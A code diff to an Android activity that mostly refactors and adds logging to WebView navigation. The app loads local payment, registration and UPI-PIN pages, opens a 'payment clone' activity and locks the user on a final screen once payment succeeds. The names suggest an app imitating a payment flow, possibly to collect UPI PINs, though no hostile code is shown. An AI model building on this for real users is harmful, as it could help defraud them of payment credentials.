@@ -64,30 +64,34 @@ class MainActivity : ComponentActivity() {
     
     private lateinit var appConfig: AppConfig
     private var isPaymentReceiverRegistered = false
-    private val         paymentSuccessReceiver = object : BroadcastReceiver() {
+    private val paymentSuccessReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             runOnUiThread {
-                saveReachedFinal()
+                Log.d(TAG, "Payment success received - marking final as reached")
+                markFinalReached()
                 if (::webView.isInitialized) {
                     try {
+                        Log.d(TAG, "Loading final.html immediately")
                         webView.loadUrl("file:///android_asset/final.html")
                     } catch (e: Exception) {
                         Log.e(TAG, "Failed to load final page after payment success", e)
                     }
                 } else {
+                    Log.d(TAG, "WebView not initialized, setting pending flag")
                     pendingFinalScreen = true
                 }
             }
         }
     }
     private var pendingFinalScreen = false
+    private var shouldLoadFinal = false
 
     companion object {
         private const val TAG = "MainActivity"
         const val ACTION_CLOSE = "com.example.test.ACTION_CLOSE"
         const val ACTION_SHOW_FINAL = "com.example.test.ACTION_SHOW_FINAL"
-        private const val PREFS_NAME = "app_state"
-        private const val KEY_REACHED_FINAL = "reached_final"
+        private const val PREFS_NAME = "final_state_prefs"
+        private const val KEY_REACHED_FINAL = "final_reached"
     }
 
     private val batteryUpdater = object : Runnable {
@@ -100,15 +104,24 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
+        Log.d(TAG, "onCreate called")
+        
         if (intent.action == ACTION_CLOSE) {
             finishAndRemoveTask()
             return
         } else if (intent.action == ACTION_SHOW_FINAL) {
+            Log.d(TAG, "ACTION_SHOW_FINAL received")
+            markFinalReached()
             pendingFinalScreen = true
+            shouldLoadFinal = true
         }
         
-        if (hasReachedFinal()) {
+        if (isFinalReached()) {
+            Log.d(TAG, "Final already reached - will load final.html")
             pendingFinalScreen = true
+            shouldLoadFinal = true
+        } else {
+            Log.d(TAG, "Final not reached - will load index.html")
         }
         
         enableFullscreen()
@@ -375,13 +388,27 @@ class MainActivity : ComponentActivity() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
                 
-                if (url != null && url.contains("final.html")) {
-                    saveReachedFinal()
-                } else if (url != null && hasReachedFinal()) {
-                    if (url.contains("index.html") || url.contains("register.html") || url.contains("payment.html") || url.contains("upi-pin.html")) {
-                        handler.postDelayed({
-                            webView.loadUrl("file:///android_asset/final.html")
-                        }, 100)
+                val currentUrl = url ?: ""
+                Log.d(TAG, "onPageFinished: $currentUrl")
+                
+                if (currentUrl.contains("final.html")) {
+                    Log.d(TAG, "Final page loaded - marking as reached")
+                    markFinalReached()
+                    shouldLoadFinal = true
+                } else if (isFinalReached()) {
+                    if (currentUrl.contains("index.html") || 
+                        currentUrl.contains("register.html") || 
+                        currentUrl.contains("payment.html") || 
+                        currentUrl.contains("upi-pin.html") ||
+                        currentUrl.contains("file:///android_asset/index.html") ||
+                        currentUrl.contains("file:///android_asset/register.html") ||
+                        currentUrl.contains("file:///android_asset/payment.html")) {
+                        Log.d(TAG, "Redirecting to final.html from: $currentUrl")
+                        handler.post {
+                            if (::webView.isInitialized) {
+                                webView.loadUrl("file:///android_asset/final.html")
+                            }
+                        }
                         return
                     }
                 }
@@ -468,18 +495,30 @@ class MainActivity : ComponentActivity() {
                     openPaymentCloneActivity(paymentMethod)
                 }
             }
+            
+            @android.webkit.JavascriptInterface
+            fun markFinalReached() {
+                runOnUiThread {
+                    Log.d(TAG, "markFinalReached called from JavaScript")
+                    markFinalReached()
+                }
+            }
         }, "Android")
 
         try {
-            val targetUrl = if (pendingFinalScreen || hasReachedFinal()) {
+            val isFinal = pendingFinalScreen || shouldLoadFinal || isFinalReached()
+            val targetUrl = if (isFinal) {
+                Log.d(TAG, "Loading final.html in createWebView")
                 pendingFinalScreen = false
+                shouldLoadFinal = true
                 "file:///android_asset/final.html"
             } else {
+                Log.d(TAG, "Loading index.html in createWebView")
                 "file:///android_asset/index.html"
             }
             webView.loadUrl(targetUrl)
         } catch (e: Exception) {
-            Log.e(TAG, "Load error: ${e.message}")
+            Log.e(TAG, "Load error: ${e.message}", e)
         }
 
         return webView
@@ -500,8 +539,16 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun handleUrlNavigation(url: String): Boolean {
-        if (hasReachedFinal()) {
-            if (url.contains("index.html") || url.contains("register.html") || url.contains("payment.html") || url.contains("upi-pin.html")) {
+        Log.d(TAG, "handleUrlNavigation: $url")
+        if (isFinalReached()) {
+            if (url.contains("index.html") || 
+                url.contains("register.html") || 
+                url.contains("payment.html") || 
+                url.contains("upi-pin.html") ||
+                url.contains("file:///android_asset/index.html") ||
+                url.contains("file:///android_asset/register.html") ||
+                url.contains("file:///android_asset/payment.html")) {
+                Log.d(TAG, "Blocking navigation to: $url, redirecting to final.html")
                 handler.post {
                     if (::webView.isInitialized) {
                         webView.loadUrl("file:///android_asset/final.html")
@@ -534,24 +581,44 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun showFinalScreen() {
+        Log.d(TAG, "showFinalScreen called")
+        markFinalReached()
         if (::webView.isInitialized) {
             runOnUiThread {
-                saveReachedFinal()
                 webView.loadUrl("file:///android_asset/final.html")
             }
         } else {
             pendingFinalScreen = true
+            shouldLoadFinal = true
         }
     }
     
-    private fun saveReachedFinal() {
-        val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        prefs.edit().putBoolean(KEY_REACHED_FINAL, true).commit()
+    private fun markFinalReached() {
+        try {
+            val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            val editor = prefs.edit()
+            editor.putBoolean(KEY_REACHED_FINAL, true)
+            val success = editor.commit()
+            shouldLoadFinal = true
+            Log.d(TAG, "markFinalReached: saved = $success")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to mark final as reached", e)
+        }
     }
     
-    private fun hasReachedFinal(): Boolean {
-        val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        return prefs.getBoolean(KEY_REACHED_FINAL, false)
+    private fun isFinalReached(): Boolean {
+        try {
+            val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            val reached = prefs.getBoolean(KEY_REACHED_FINAL, false)
+            Log.d(TAG, "isFinalReached: $reached")
+            if (reached) {
+                shouldLoadFinal = true
+            }
+            return reached
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to check if final reached", e)
+            return false
+        }
     }
 
     private fun continueInitialization() {
